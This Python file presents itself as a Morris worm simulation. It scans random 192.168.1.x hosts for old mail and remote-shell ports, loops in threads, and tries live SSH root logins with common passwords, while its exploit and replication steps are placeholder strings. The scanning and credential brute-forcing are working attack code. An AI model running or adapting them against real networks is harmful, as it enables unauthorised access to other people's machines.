""" alBz and Morris Worms """

import random
import socket
import threading
import time
import paramiko

NETWORK_RANGE = "192.168.1.{}"

VULNERABLE_SERVICES = {
    "sendmail": 25,
    "finger": 79,
    "rexec": 512,
    "rsh": 514
}

# TODO: function to generate more passwords or use IA to generate more passwords
COMMON_PASSWORDS = ["123456", "password", "admin", "letmein", "1234"]


def scan_target(target_ip):
    """ Simulate port scanning to find open ports on the target machine. """
    open_ports = []
    print(f"Scanning {target_ip} for open ports...")

    for service, port in VULNERABLE_SERVICES.items():
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((target_ip, port))
                if result == 0:
                    print(f"Port {port} (service: {service}) open on {target_ip}")
                    open_ports.append(port)
        except socket.error as e:
            print(f"Error scanning {target_ip} on port {port}: {e}")

    return open_ports


def crack_password(target_ip, service):
    """ Simulate password cracking for a vulnerable SSH service. """
    print(f"Attempting to crack password for {service} on {target_ip}...")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in COMMON_PASSWORDS:
        print(f"Trying password: {password}")
        time.sleep(1)  # Simulate time taken to attempt this password

        try:
            # Attempt to connect to the SSH server with the password
            ssh.connect(target_ip, username='root', password=password, timeout=5)
            print(f"Password cracked for {service} on {target_ip}: {password}")
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            # Password is incorrect, try the next one
            continue
        except socket.error as e:
            print(f"Error during password attempt: {e}")
            continue

    print(f"Failed to crack password for {service} on {target_ip}.")
    return False


def exploit_service(service_name, target_host, port):
    """ Simulate an exploit for a vulnerable service """
    try:
        if service_name == "sendmail":
            payload = "MAIL FROM: <worm@worm.com>\r\n"
            print(f"Sending malicious email via {service_name} on {target_host}:{port}")

        elif service_name in ["rexec", "rsh"]:
            if crack_password(target_host, service_name):
                payload = f"Authenticated exploit payload for {service_name}\r\n"
            else:
                print(f"Failed to exploit {service_name} on "
                      f"{target_host}:{port} due to password failure.")
                return  # Stop if password cracking fails

        else:
            payload = f"Generic exploit payload for {service_name}\r\n"

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_host, port))
            s.sendall(payload.encode())
            print(f"Successfully exploited {service_name} on {target_host}:{port}")

            # Simulate dropping a payload (replication)
            install_payload(target_host)

    except socket.error as e:
        print(f"Failed to exploit {service_name} on {target_host}:{port}: {e}")


def install_payload(target_ip):
    """ Simulate dropping a payload on the infected machine. """
    print(f"Installing worm on {target_ip}...")

    try:
        fake_payload = f"Worm payload on {target_ip}\n"
        with open(f"/tmp/worm_{target_ip}.txt", "w", encoding="utf-8") as f:
            f.write(fake_payload)
        print(f"Worm installed on {target_ip}.")
    except IOError as e:
        print(f"Failed to install worm on {target_ip}: {e}")


def replicate():
    """ Simulate the worm's replication process. """
    while True:
        target_ip = NETWORK_RANGE.format(random.randint(1, 254))
        print(f"Attempting to replicate to {target_ip}...")

        open_ports = scan_target(target_ip)
        if open_ports:
            for port in open_ports:
                for service, service_port in VULNERABLE_SERVICES.items():
                    if service_port == port:
                        exploit_service(service, target_ip, port)

        time.sleep(random.randint(5, 15))


def main():
    """ Main function to start the Morris worm simulation. """
    print("Morris Worm simulation started...")

    # Start multiple threads to simulate worm replication across different machines
    for _ in range(3):  # Simulate 3 instances of the worm
        thread = threading.Thread(target=replicate)
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(60)  # Simulate worm staying active
    except KeyboardInterrupt:
        print("Worm terminated by user.")


if __name__ == "__main__":
    main()
